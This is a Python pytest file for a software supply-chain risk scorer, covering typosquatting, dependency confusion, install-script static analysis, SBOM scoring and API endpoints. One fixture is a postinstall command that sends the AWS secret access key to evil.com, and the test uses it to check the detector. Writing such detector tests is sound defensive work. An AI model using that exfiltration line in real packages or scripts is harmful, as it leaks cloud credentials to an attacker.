from __future__ import annotations
import os
import sys
import pytest
from fastapi.testclient import TestClient

current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
if parent_dir not in sys.path:
    sys.path.insert(0, parent_dir)

from scorer.engine import DependencyRiskEngine
from scorer.models import InstallScripts, PackageQuery, SBOMScoreRequest
from scorer.typosquat import TyposquatDetector, damerau_levenshtein
from scorer.confusion import DependencyConfusionDetector
from scorer.static_analysis import ScriptStaticAnalyzer
from api.main import app


@pytest.fixture
def engine():
    return DependencyRiskEngine()


@pytest.fixture
def client():
    return TestClient(app)


def test_damerau_levenshtein_distance():
    assert damerau_levenshtein("lodash", "lodash") == 0
    assert damerau_levenshtein("lod-ash", "lodash") == 1
    assert damerau_levenshtein("requsts", "requests") == 1
    assert damerau_levenshtein("reac", "react") == 1


def test_typosquat_detection():
    detector = TyposquatDetector()
    factors = detector.analyze("lod-ash", "npm")
    assert any(f.name == "separator_trick" for f in factors)

    factors = detector.analyze("requsts", "pypi")
    assert any("damerau_levenshtein" in f.name for f in factors)


def test_dependency_confusion():
    detector = DependencyConfusionDetector()
    factors = detector.analyze("byteaegis-auth-token", version="99.0.0", ecosystem="npm")
    assert any(f.name == "internal_naming_pattern" for f in factors)
    assert any(f.name == "inflated_version_number" for f in factors)


def test_static_analysis_credentials_and_network():
    analyzer = ScriptStaticAnalyzer()
    scripts = InstallScripts(
        postinstall="node -e 'require(\"http\").get(\"http://evil.com/?k=\"+process.env.AWS_SECRET_ACCESS_KEY)'"
    )
    factors = analyzer.analyze(scripts)
    assert any("credential_exfiltration" in f.name for f in factors)
    assert any("outbound_network" in f.name for f in factors)


def test_engine_package_scoring_and_hard_gate(engine):
    # Legitimate clean package
    clean_pkg = PackageQuery(name="react", ecosystem="npm")
    clean_score = engine.score_package(clean_pkg)
    assert clean_score.score == 0
    assert clean_score.risk_level == "LOW"
    assert not clean_score.is_malicious

    # Known malicious package
    mal_pkg = PackageQuery(name="crossenv", ecosystem="npm")
    mal_score = engine.score_package(mal_pkg)
    assert mal_score.score == 100
    assert mal_score.is_malicious
    assert mal_score.hard_gate_triggered


def test_engine_sbom_scoring(engine):
    req = SBOMScoreRequest(
        components=[
            PackageQuery(name="react", ecosystem="npm"),
            PackageQuery(name="lodash", ecosystem="npm"),
            PackageQuery(name="crossenv", ecosystem="npm"),
        ],
        risk_threshold=65,
    )
    resp = engine.score_sbom(req)
    assert resp.overall_risk_score == 100
    assert resp.has_malicious_packages
    assert resp.verdict == "deny"
    assert resp.component_count == 3
    assert resp.flagged_packages_count >= 1


def test_fastapi_endpoints(client):
    # Test healthz
    r = client.get("/healthz")
    assert r.status_code == 200
    assert r.json()["status"] == "healthy"

    # Test /score/package
    r = client.post("/score/package", json={"name": "lod-ash", "ecosystem": "npm"})
    assert r.status_code == 200
    data = r.json()
    assert data["score"] >= 80

    # Test /score/sbom
    sbom_payload = {
        "components": [
            {"name": "lodash", "ecosystem": "npm"},
            {"name": "express", "ecosystem": "npm"},
        ],
        "risk_threshold": 65,
    }
    r = client.post("/score/sbom", json=sbom_payload)
    assert r.status_code == 200
    data = r.json()
    assert data["verdict"] == "allow"
    assert data["overall_risk_score"] == 0
